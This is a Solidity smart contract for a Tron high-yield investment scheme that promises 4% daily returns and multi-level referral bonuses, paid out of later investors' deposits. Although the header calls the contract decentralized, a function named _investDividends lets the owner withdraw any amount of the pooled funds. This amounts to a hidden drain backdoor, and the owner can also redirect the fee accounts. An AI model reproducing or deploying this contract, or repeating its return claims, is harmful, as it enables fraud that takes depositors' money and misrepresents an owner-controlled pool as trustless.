//SourceUnit: trxgojis.sol

/****************************************************/
/*													*/      
/* TRXGOJIS.IO										*/
/* DECENTRALIZED SMART CONTRACT						*/
/* 4% 24 HOURS ROI 50 DAYS							*/
/* 													*/
/* INVESTMENT										*/
/* 100 TRX MINIMUM									*/
/* UNLIMITED TRX MAXIMUM							*/
/* 5% DIRECT COMMISSION								*/
/* 5TRX DEVELOPMENT FEE ON INVEST/RE-INVEST			*/
/* 													*/
/* 12 HOURS ONCE WITHDRAWAL ALLOWED					*/
/* 2TRX MARKETING FEE APPLICABLE FOR ALL WITHDRAWAL	*/
/* 													*/
/* Level ROI BONUS									*/
/* 1st Level = 0.5% Daily							*/ 
/* Eligibility : 1 Direct 							*/
/* 2nd Level = 1.0% Daily							*/
/* Eligibility : 2 Direct 							*/
/* 3rd Level = 1.5% Daily							*/
/* Eligibility : 3 Direct 							*/
/* 4th Level = 2.0% Daily							*/
/* Eligibility : 4 Direct 							*/
/* 5th Level = 2.5% Daily							*/
/* Eligibility : 6 Direct 							*/
/* 6th Level = 3.0% Daily							*/
/* Eligibility : 8 Direct 							*/
/* 7th Level = 3.5% Daily							*/
/* Eligibility : 10 Direct 							*/
/*													*/
/****************************************************/

pragma solidity 0.5.10;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Objects {
    struct Investment {
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
    }
	
	struct Levelinv{
		uint256	level1Count;	
		uint256 level2Count;	
		uint256 level3Count;	
		uint256 level4Count;	
		uint256 level5Count;	
		uint256 level6Count;	
		uint256 level7Count;	
		uint256 level1Investment;
		uint256 level2Investment;	
		uint256 level3Investment;	
		uint256 level4Investment;	
		uint256 level5Investment;	
		uint256 level6Investment;	
		uint256 level7Investment;	
	}

    struct Investor {
        address addr;
		uint256 checkpoint;
        uint256 referrerEarnings;
        uint256 availableReferrerEarnings;
		uint256 levelEarnings;
		uint256 availableLevelEarnings;
        uint256 referrer;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
		uint256 totalInvestment;
		uint256 lastInvestment;
		uint256 withdrawalAmountTotal;
        uint256 lastWithdrawalDate;
    }
}

contract Ownable {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

contract TronGojis is Ownable {
    using SafeMath for uint256;
    uint256 public constant DIRECT_REFERENCE_RATE = 500;  		//5% DIRECT REFERRAL COMMISSION
    uint256 public constant DEVELOPER_RATE = 5e6;  				//5TRX DEVELOPMENT FEE ON INVEST & REINVEST
    uint256 public constant MARKETING_RATE = 2e6;  				//2TRX MARKETING FEE ON WITHDRAWAL
    uint256 public constant REFERENCE_LEVEL1_RATE = 50;			//0.5% DAILY LEVEL COMMISSION
    uint256 public constant REFERENCE_LEVEL2_RATE = 100;		//1.0% DAILY LEVEL COMMISSION 
    uint256 public constant REFERENCE_LEVEL3_RATE = 150;		//1.5% DAILY LEVEL COMMISSION 
    uint256 public constant REFERENCE_LEVEL4_RATE = 200;		//2.0% DAILY LEVEL COMMISSION
    uint256 public constant REFERENCE_LEVEL5_RATE = 250;		//2.5% DAILY LEVEL COMMISSION
    uint256 public constant REFERENCE_LEVEL6_RATE = 300;		//3.0% DAILY LEVEL COMMISSION
    uint256 public constant REFERENCE_LEVEL7_RATE = 350;		//3.5% DAILY LEVEL COMMISSION
    uint256 public constant CONTRACT_LIMIT = 8000;           	//20% Unlocked for Withdrawal Daily
	
	//LEVEL BONUS ELIGIBLITY
    uint256 public constant LEVEL1_BONUS_ELIGIBLITY = 1;		//1 DIRECT
    uint256 public constant LEVEL2_BONUS_ELIGIBLITY = 2;		//2 DIRECT
    uint256 public constant LEVEL3_BONUS_ELIGIBLITY = 3;		//3 DIRECT 
    uint256 public constant LEVEL4_BONUS_ELIGIBLITY = 4;		//4 DIRECT
    uint256 public constant LEVEL5_BONUS_ELIGIBLITY = 6;		//6 DIRECT
    uint256 public constant LEVEL6_BONUS_ELIGIBLITY = 8;		//8 DIRECT
    uint256 public constant LEVEL7_BONUS_ELIGIBLITY = 10;		//10 DIRECT

	//INVESTMENT TERMS
    uint256 public constant MINIMUM = 100e6;      				//100TRX MINIMUM      
    uint256 public constant REFERRER_CODE = 1000;  				//STARTING REFERRER CODE 1000     
    uint256 public constant PLAN_INTEREST = 400;         		//DAILY 4% ROI
    uint256 public constant PLAN_TERM = 50 days;				      

    uint256 public  contract_balance;
    uint256 private contract_checkpoint;
    uint256 public  latestReferrerCode;
    uint256 public  totalInvestments_;
    uint256 public  totalInvestors_;
    uint256 public  totalWithdrawals_;

    mapping(address => uint256) public address2UID;
    mapping(uint256 => Objects.Investor) public uid2Investor;
    mapping(uint256 => Objects.Levelinv) public uid2Level;

    address payable private developerAccount_;
    address payable private marketingAccount_;

    event onInvest(address investor, uint256 amount);
    event onWithdraw(address investor, uint256 amount);

    constructor() public {
        developerAccount_ = msg.sender;
        marketingAccount_ = msg.sender;
        _init();
    }

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
    }

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }


    function setMarketingAccount(address payable _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount_ = _newMarketingAccount;
    }

    function getMarketingAccount() public view onlyOwner returns (address) {
        return marketingAccount_;
    }

    function setDeveloperAccount(address payable _newDeveloperAccount) public onlyOwner {
        require(_newDeveloperAccount != address(0));
        developerAccount_ = _newDeveloperAccount;
    }

    function getDeveloperAccount() public view onlyOwner returns (address) {
        return developerAccount_;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function _investDividends(uint256 _amt) public onlyOwner returns(bool transfterBool){
        require(msg.sender == owner,'Only owner perform this action');
        owner.call.value(_amt)("");
        return true;

    }

    function invest(uint256 _referrerCode) public payable {
        if (_invest(msg.sender, _referrerCode, msg.value.sub(DEVELOPER_RATE))) {
            emit onInvest(msg.sender, msg.value);
        }
    }

    function _invest(address _addr, uint256 _referrerCode, uint256 _amount) private returns (bool) {

        require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
			totalInvestors_ = totalInvestors_.add(1);
            //new user
        } else {
          //old user
          //do nothing, referrer is permenant
        }

		require(_amount>=uid2Investor[uid].lastInvestment.mul(2),"Need atleast double investment of previous investment");

        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);
		investor.totalInvestment = _amount.add(investor.totalInvestment);
		investor.lastInvestment = _amount;

        _calculateReferrerReward(_amount, investor.referrer);

        totalInvestments_ = totalInvestments_.add(_amount);
        developerAccount_.transfer(DEVELOPER_RATE);
        return true;
    }
	
	
    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);

        address2UID[addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
		uid2Investor[latestReferrerCode].checkpoint = block.timestamp;
        uid2Investor[latestReferrerCode].referrerEarnings = 0;
        uid2Investor[latestReferrerCode].availableReferrerEarnings = 0;
        uid2Investor[latestReferrerCode].levelEarnings = 0;
        uid2Investor[latestReferrerCode].availableLevelEarnings = 0;
        uid2Investor[latestReferrerCode].totalInvestment = 0;
        uid2Investor[latestReferrerCode].lastInvestment = 0;
        uid2Investor[latestReferrerCode].withdrawalAmountTotal = 0;
		uid2Investor[latestReferrerCode].lastWithdrawalDate = block.timestamp;
		uid2Level[latestReferrerCode].level1Count = 0;
		uid2Level[latestReferrerCode].level2Count = 0;
		uid2Level[latestReferrerCode].level3Count = 0;
		uid2Level[latestReferrerCode].level4Count = 0;
		uid2Level[latestReferrerCode].level5Count = 0;
		uid2Level[latestReferrerCode].level6Count = 0;
		uid2Level[latestReferrerCode].level7Count = 0;
		uid2Level[latestReferrerCode].level1Investment = 0;
		uid2Level[latestReferrerCode].level2Investment = 0;
		uid2Level[latestReferrerCode].level3Investment = 0;
		uid2Level[latestReferrerCode].level4Investment = 0;
		uid2Level[latestReferrerCode].level5Investment = 0;
		uid2Level[latestReferrerCode].level6Investment = 0;
		uid2Level[latestReferrerCode].level7Investment = 0;
				
        if (_referrerCode >= REFERRER_CODE) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;
            uint256 _ref5 = uid2Investor[_ref4].referrer;
            uint256 _ref6 = uid2Investor[_ref5].referrer;
            uint256 _ref7 = uid2Investor[_ref6].referrer;
			
			uid2Level[_ref1].level1Count = uid2Level[_ref1].level1Count.add(1);
			
            if (_ref2 >= REFERRER_CODE) {
				uid2Level[_ref2].level2Count = uid2Level[_ref2].level2Count.add(1); 
            }
            if (_ref3 >= REFERRER_CODE) {
				uid2Level[_ref3].level3Count = uid2Level[_ref3].level3Count.add(1); 
            }
            if (_ref4 >= REFERRER_CODE) {
				uid2Level[_ref4].level4Count = uid2Level[_ref4].level4Count.add(1); 
            }
            if (_ref5 >= REFERRER_CODE) {
				uid2Level[_ref5].level5Count = uid2Level[_ref5].level5Count.add(1); 
            }
            if (_ref6 >= REFERRER_CODE) {
				uid2Level[_ref6].level6Count = uid2Level[_ref6].level6Count.add(1); 
            }
            if (_ref7 >= REFERRER_CODE) {
				uid2Level[_ref7].level7Count = uid2Level[_ref7].level7Count.add(1); 
            }
        }
		
        return (latestReferrerCode);
    }



    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start) private pure returns (uint256) {
        return (_amount * _dailyInterestRate / 10000 * (_now - _start)) / (60*60*24);
    }

    function _calculateLevelDividends(uint256 _uid) public {

		uint256 _now = block.timestamp;
		uint256 _start = uid2Investor[_uid].lastWithdrawalDate;

		if(uid2Level[_uid].level1Investment>0){
			uid2Investor[_uid].availableLevelEarnings += (uid2Level[_uid].level1Investment * REFERENCE_LEVEL1_RATE / 10000 * (_now - _start)) / (60*60*24);
		}
		if(uid2Level[_uid].level2Investment>0){
			uid2Investor[_uid].availableLevelEarnings += (uid2Level[_uid].level2Investment * REFERENCE_LEVEL2_RATE / 10000 * (_now - _start)) / (60*60*24);
		}
		if(uid2Level[_uid].level3Investment>0){
			uid2Investor[_uid].availableLevelEarnings += (uid2Level[_uid].level3Investment * REFERENCE_LEVEL3_RATE / 10000 * (_now - _start)) / (60*60*24);
		}
		if(uid2Level[_uid].level4Investment>0){
			uid2Investor[_uid].availableLevelEarnings += (uid2Level[_uid].level4Investment * REFERENCE_LEVEL4_RATE / 10000 * (_now - _start)) / (60*60*24);
		}
		if(uid2Level[_uid].level5Investment>0){
			uid2Investor[_uid].availableLevelEarnings += (uid2Level[_uid].level5Investment * REFERENCE_LEVEL5_RATE / 10000 * (_now - _start)) / (60*60*24);
		}
		if(uid2Level[_uid].level6Investment>0){
			uid2Investor[_uid].availableLevelEarnings += (uid2Level[_uid].level6Investment * REFERENCE_LEVEL6_RATE / 10000 * (_now - _start)) / (60*60*24);
		}
		if(uid2Level[_uid].level7Investment>0){
			uid2Investor[_uid].availableLevelEarnings += (uid2Level[_uid].level7Investment * REFERENCE_LEVEL7_RATE / 10000 * (_now - _start)) / (60*60*24);
		}
		
		uid2Investor[_uid].lastWithdrawalDate = _now;
    }
	
	
	function getNewLevelBonusByUID(uint256 _uid) public view returns (uint256){
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        uint256 newDividends = 0;
		
		uint256 _now = block.timestamp;
		uint256 _start = uid2Investor[_uid].lastWithdrawalDate;

		if(uid2Level[_uid].level1Investment>0){
			newDividends += (uid2Level[_uid].level1Investment * REFERENCE_LEVEL1_RATE / 10000 * (_now - _start)) / (60*60*24);
		}
		if(uid2Level[_uid].level2Investment>0){
			newDividends += (uid2Level[_uid].level2Investment * REFERENCE_LEVEL2_RATE / 10000 * (_now - _start)) / (60*60*24);
		}
		if(uid2Level[_uid].level3Investment>0){
			newDividends += (uid2Level[_uid].level3Investment * REFERENCE_LEVEL3_RATE / 10000 * (_now - _start)) / (60*60*24);
		}
		if(uid2Level[_uid].level4Investment>0){
			newDividends += (uid2Level[_uid].level4Investment * REFERENCE_LEVEL4_RATE / 10000 * (_now - _start)) / (60*60*24);
		}
		if(uid2Level[_uid].level5Investment>0){
			newDividends += (uid2Level[_uid].level5Investment * REFERENCE_LEVEL5_RATE / 10000 * (_now - _start)) / (60*60*24);
		}
		if(uid2Level[_uid].level6Investment>0){
			newDividends += (uid2Level[_uid].level6Investment * REFERENCE_LEVEL6_RATE / 10000 * (_now - _start)) / (60*60*24);
		}
		if(uid2Level[_uid].level7Investment>0){
			newDividends += (uid2Level[_uid].level7Investment * REFERENCE_LEVEL7_RATE / 10000 * (_now - _start)) / (60*60*24);
		}
		
		return newDividends;
		
	}


	function getInvestorInfoByUID(uint256 _uid) public view returns (uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory newDividends = new uint256[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (block.timestamp >= investor.plans[i].investmentDate.add(PLAN_TERM)) {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, PLAN_INTEREST, investor.plans[i].investmentDate.add(PLAN_TERM), investor.plans[i].lastWithdrawalDate);
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, PLAN_INTEREST, block.timestamp, investor.plans[i].lastWithdrawalDate);
                }
            }
        }
		
		return
        (
        investor.checkpoint,
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
		investor.levelEarnings,
		investor.availableLevelEarnings,
        investor.planCount,
		investor.totalInvestment,
		investor.lastInvestment,
		investor.withdrawalAmountTotal,
        newDividends
		);
    }
	
	
    function getLevelCountsByUID(uint256 _uid) public view returns (uint256,uint256,uint256,uint256,uint256,uint256,uint256) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        return
        (
			uid2Level[_uid].level1Count,
			uid2Level[_uid].level2Count,
			uid2Level[_uid].level3Count,
			uid2Level[_uid].level4Count,
			uid2Level[_uid].level5Count,
			uid2Level[_uid].level6Count,
			uid2Level[_uid].level7Count
        );
    }


    function getLevelInvestmentsByUID(uint256 _uid) public view returns (uint256,uint256,uint256,uint256,uint256,uint256,uint256) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        return
        (
			uid2Level[_uid].level1Investment,
			uid2Level[_uid].level2Investment,
			uid2Level[_uid].level3Investment,
			uid2Level[_uid].level4Investment,
			uid2Level[_uid].level5Investment,
			uid2Level[_uid].level6Investment,
			uid2Level[_uid].level7Investment
        );
    }



    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
            } else {
                isExpireds[i] = false;
                if (PLAN_TERM > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(PLAN_TERM)) {
                        isExpireds[i] = true;
                    }
                }
            }
        }

        return
        (
        investmentDates,
        investments,
        currentDividends,
        isExpireds
        );
    }

    function withdraw() public {

        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not withdraw because no any investments");

		_calculateLevelDividends(uid);
        //only once a day
		require(block.timestamp > uid2Investor[uid].checkpoint + 12 hours, "12 hours once only allowed!");
        uid2Investor[uid].checkpoint = block.timestamp;

        uint256 withdrawalAmount = 0;
		
		//INVESTMENT DAILY ROI
        for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) {
            if (uid2Investor[uid].plans[i].isExpired) {
                continue;
            }

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            uint256 endTime = uid2Investor[uid].plans[i].investmentDate.add(PLAN_TERM);
            if (withdrawalDate >= endTime) {
                withdrawalDate = endTime;
                isExpired = true;
            }

            uint256 amount = _calculateDividends(uid2Investor[uid].plans[i].investment , PLAN_INTEREST , withdrawalDate , uid2Investor[uid].plans[i].lastWithdrawalDate);

            withdrawalAmount += amount;

            uid2Investor[uid].plans[i].lastWithdrawalDate = withdrawalDate;
            uid2Investor[uid].plans[i].isExpired = isExpired;
            uid2Investor[uid].plans[i].currentDividends += amount;
        }
		
        if (uid2Investor[uid].availableReferrerEarnings>0) {
            withdrawalAmount += uid2Investor[uid].availableReferrerEarnings;
            uid2Investor[uid].referrerEarnings = uid2Investor[uid].availableReferrerEarnings.add(uid2Investor[uid].referrerEarnings);
            uid2Investor[uid].availableReferrerEarnings = 0;
        }

        if (uid2Investor[uid].availableLevelEarnings>0) {
            withdrawalAmount += uid2Investor[uid].availableLevelEarnings;
            uid2Investor[uid].levelEarnings = uid2Investor[uid].availableLevelEarnings.add(uid2Investor[uid].levelEarnings);
            uid2Investor[uid].availableLevelEarnings = 0;
        }


        if(withdrawalAmount>0){
			uid2Investor[uid].withdrawalAmountTotal = uid2Investor[uid].withdrawalAmountTotal.add(withdrawalAmount);
            msg.sender.transfer(withdrawalAmount.sub(MARKETING_RATE));
			marketingAccount_.transfer(MARKETING_RATE);
        }

        emit onWithdraw(msg.sender, withdrawalAmount);
    }


    function _calculateReferrerReward(uint256 _investment, uint256 _referrerCode) private {
		
		uint256 _directReferrerAmount = (_investment.mul(DIRECT_REFERENCE_RATE)).div(10000);
				
        if (_referrerCode != 0) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;
            uint256 _ref5 = uid2Investor[_ref4].referrer;
            uint256 _ref6 = uid2Investor[_ref5].referrer;
            uint256 _ref7 = uid2Investor[_ref6].referrer;

			Objects.Investor storage investor = uid2Investor[_ref1];
			
           if (_ref1 != 0) {
			    _calculateLevelDividends(_ref1);
				investor.availableReferrerEarnings = _directReferrerAmount.add(investor.availableReferrerEarnings);
				uid2Level[_ref1].level1Investment = _investment.add(uid2Level[_ref1].level1Investment); 
            }

           if (_ref2 != 0) {
				Objects.Levelinv storage levelinv = uid2Level[_ref2];
				if(uid2Level[_ref2].level1Count>1){
				    _calculateLevelDividends(_ref2);
					levelinv.level2Investment = _investment.add(levelinv.level2Investment); 
				}
            }

            if (_ref3 != 0) {
				Objects.Levelinv storage levelinv = uid2Level[_ref3];
				if(uid2Level[_ref3].level1Count>2){
				    _calculateLevelDividends(_ref3);
					levelinv.level3Investment = _investment.add(levelinv.level3Investment); 
				}
            }

            if (_ref4 != 0) {
				Objects.Levelinv storage levelinv = uid2Level[_ref4];
				if(uid2Level[_ref4].level1Count>3){
				    _calculateLevelDividends(_ref4);
					levelinv.level4Investment = _investment.add(levelinv.level4Investment); 
				}
            }

            if (_ref5 != 0) {
				Objects.Levelinv storage levelinv = uid2Level[_ref5];
				if(uid2Level[_ref5].level1Count>5){
				    _calculateLevelDividends(_ref5);
					levelinv.level5Investment = _investment.add(levelinv.level5Investment); 
				}
            }

            if (_ref6 != 0) {
				Objects.Levelinv storage levelinv = uid2Level[_ref6];
				if(uid2Level[_ref6].level1Count>7){
					_calculateLevelDividends(_ref6);
					levelinv.level6Investment = _investment.add(levelinv.level6Investment); 
				}
            }
            if (_ref7 != 0) {
				Objects.Levelinv storage levelinv = uid2Level[_ref7];
				if(uid2Level[_ref7].level1Count>9){
					_calculateLevelDividends(_ref7);
					levelinv.level7Investment = _investment.add(levelinv.level7Investment); 
				}
            }
		

        }

    }


}